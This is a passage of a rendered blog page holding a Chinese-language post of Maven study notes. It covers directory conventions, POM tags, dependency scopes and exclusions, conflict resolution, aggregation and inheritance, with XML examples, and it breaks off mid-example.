<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/6/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-maven学习笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.631Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">maven学习笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="maven学习笔记"><a href="#maven学习笔记" class="headerlink" title="maven学习笔记"></a>maven学习笔记</h1><h2 id="学习网站"><a href="#学习网站" class="headerlink" title="学习网站"></a>学习网站</h2><p> <a target="_blank" rel="noopener" href="https://www.imooc.com/learn/443">https://www.imooc.com/learn/443</a> (这个挺好的)</p>
<p> <a target="_blank" rel="noopener" href="https://www.runoob.com/maven/maven-tutorial.html">https://www.runoob.com/maven/maven-tutorial.html</a> </p>
<h2 id="maven功能"><a href="#maven功能" class="headerlink" title="maven功能"></a>maven功能</h2><ul>
<li>构建</li>
<li>文档生成</li>
<li>报告</li>
<li>依赖</li>
<li>SCMs</li>
<li>发布</li>
<li>分发</li>
<li>邮件列表</li>
</ul>
<h2 id="约定配置"><a href="#约定配置" class="headerlink" title="约定配置"></a>约定配置</h2><p>Maven 提倡使用一个共同的标准目录结构，Maven 使用约定优于配置的原则，大家尽可能的遵守这样的目录结构。如下所示：</p>
<table>
<thead>
<tr>
<th align="left">目录</th>
<th align="left">目的</th>
</tr>
</thead>
<tbody><tr>
<td align="left">${basedir}</td>
<td align="left">存放pom.xml和所有的子目录</td>
</tr>
<tr>
<td align="left">${basedir}/src/main/java</td>
<td align="left">项目的java源代码</td>
</tr>
<tr>
<td align="left">${basedir}/src/main/resources</td>
<td align="left">项目的资源，比如说property文件，springmvc.xml</td>
</tr>
<tr>
<td align="left">${basedir}/src/test/java</td>
<td align="left">项目的测试类，比如说Junit代码</td>
</tr>
<tr>
<td align="left">${basedir}/src/test/resources</td>
<td align="left">测试用的资源</td>
</tr>
<tr>
<td align="left">${basedir}/src/main/webapp/WEB-INF</td>
<td align="left">web应用文件目录，web项目的信息，比如存放web.xml、本地图片、jsp视图页面</td>
</tr>
<tr>
<td align="left">${basedir}/target</td>
<td align="left">打包输出目录</td>
</tr>
<tr>
<td align="left">${basedir}/target/classes</td>
<td align="left">编译输出目录</td>
</tr>
<tr>
<td align="left">${basedir}/target/test-classes</td>
<td align="left">测试编译输出目录</td>
</tr>
<tr>
<td align="left">Test.java</td>
<td align="left">Maven只会自动运行符合该命名规则的测试类</td>
</tr>
<tr>
<td align="left">~/.m2/repository</td>
<td align="left">Maven默认的本地仓库目录位置</td>
</tr>
</tbody></table>
<h2 id="Maven-POM"><a href="#Maven-POM" class="headerlink" title="Maven POM"></a>Maven POM</h2><p> POM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件 ,用于描述如何构建项目</p>
<p>在创建 POM 之前，我们首先需要描述项目组 (groupId), 项目的唯一ID。 </p>
<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span> = <span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span> = <span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span> = <span class="string">&quot;http://maven.apache.org/POM/4.0.0</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 模型版本 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.companyname.project-group(公司网站反写+项目名)<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>project+模块名<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 版本号 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="常见标签解释"><a href="#常见标签解释" class="headerlink" title="常见标签解释"></a>常见标签解释</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span> = <span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span> = <span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span> = <span class="string">&quot;http://maven.apache.org/POM/4.0.0</span></span></span><br><span class="line"><span class="string"><span class="tag">    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 模型版本 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.companyname.project-group(公司网站反写+项目名)<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>project+模块名<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 版本号</span></span><br><span class="line"><span class="comment"> 	第一个数字表示大版本号</span></span><br><span class="line"><span class="comment">	第二个数字表示分支版本号</span></span><br><span class="line"><span class="comment">	第三个数字表示小版本号</span></span><br><span class="line"><span class="comment">	snapshot 快照</span></span><br><span class="line"><span class="comment">	alpha 内部测试</span></span><br><span class="line"><span class="comment">	beta 公测</span></span><br><span class="line"><span class="comment">	Release 稳定版本</span></span><br><span class="line"><span class="comment">	GA 正式发布</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-xxx<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 打包方式，默认是jar,还有:war zip pom--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span><span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目描述名--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目地址 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span><span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目描述 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">descriptions</span>&gt;</span><span class="tag">&lt;/<span class="name">descriptions</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--开发人员信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">developers</span>&gt;</span><span class="tag">&lt;/<span class="name">developers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependeies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.companyname.project-group(公司网站反写+项目名)<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>project+模块名<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    		<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-xxx<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span><span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 在test中有用 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--设置依赖是否可选，默认False，设为False则子项目默认继承，否则得显示声明--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span><span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 排除依赖传递列表</span></span><br><span class="line"><span class="comment">				如A依赖B，B依赖C，而A不依赖C，此时就可以在此处添加C，来排除依赖</span></span><br><span class="line"><span class="comment"> 			--&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependeies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 依赖的管理，子pom自动继承，但是本身并不依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependeies</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependeies</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 详情见在某个阶段使用插件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 聚合运行多个maven项目,一口气全部编译 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="执行main函数"><a href="#执行main函数" class="headerlink" title="执行main函数"></a>执行main函数</h3><p>在pom下的project添加：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.mojo<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>exec-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">phase</span>&gt;</span>test<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">goal</span>&gt;</span>java<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.vineetmanohar.module.CodeGenerator<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">arguments</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">argument</span>&gt;</span>arg0<span class="tag">&lt;/<span class="name">argument</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">argument</span>&gt;</span>arg1<span class="tag">&lt;/<span class="name">argument</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">arguments</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h3 id="依赖范围"><a href="#依赖范围" class="headerlink" title="依赖范围"></a>依赖范围</h3><ul>
<li>compile<br>默认的范围，编译测试运行都有效</li>
<li>provided<br>在测试和编译时有效</li>
<li>runtime<br>在测试和运行时有效</li>
<li>test<br>只有在测试中有效</li>
</ul>
<h3 id="排除依赖"><a href="#排除依赖" class="headerlink" title="排除依赖"></a>排除依赖</h3><p>在pom中的project下添加</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 排除依赖传递列表</span></span><br><span class="line"><span class="comment">				如A依赖B，B依赖C，而A不依赖C，此时就可以在此处添加C，来排除依赖</span></span><br><span class="line"><span class="comment"> 			--&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="依赖冲突解决原则"><a href="#依赖冲突解决原则" class="headerlink" title="依赖冲突解决原则"></a>依赖冲突解决原则</h3><h4 id="短路优先"><a href="#短路优先" class="headerlink" title="短路优先"></a>短路优先</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A -&gt; B -&gt; C -&gt; X1</span><br><span class="line">A -&gt; D -&gt; X2</span><br><span class="line">#A -&gt; D代表 A依赖于D</span><br><span class="line">此时A依赖于X2</span><br></pre></td></tr></table></figure>





<h4 id="先声明先优先"><a href="#先声明先优先" class="headerlink" title="先声明先优先"></a>先声明先优先</h4><p>如果路径长度相同(依赖链)，则谁先声明，先解析谁</p>
<h3 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h3><p>在容器pom中修改packaging为pom，添加modules</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>现有maven项目:maven01和maven02</p>
<p>新建maven项目：maven03,三个项目均在同一个文件夹下</p>
<p>在maven03中修改packaging为pom，添加如下modules</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span></span><br><span class="line">        ../maven01</span><br><span class="line">    <span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">module</span>&gt;</span></span><br><span class="line">        ../maven02</span><br><span class="line">    <span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>当多个maven模块都依赖一个相同的库时，多次声明显得太麻烦此时可以用继承来解决</p>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>现有两个maven项目(maven01,maven02)都使用junit:3.8.1</p>
<p>新建父maven项目:maven03，其对应的pom文件为：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.ccreater<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven03<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>maven03<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  		<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将相同的依赖都添加到dependencyManagement下，并修改packaging为pom</p>
<p>maven01和maven02的pom文件均为：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.ccreater<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven02<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>maven02<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span 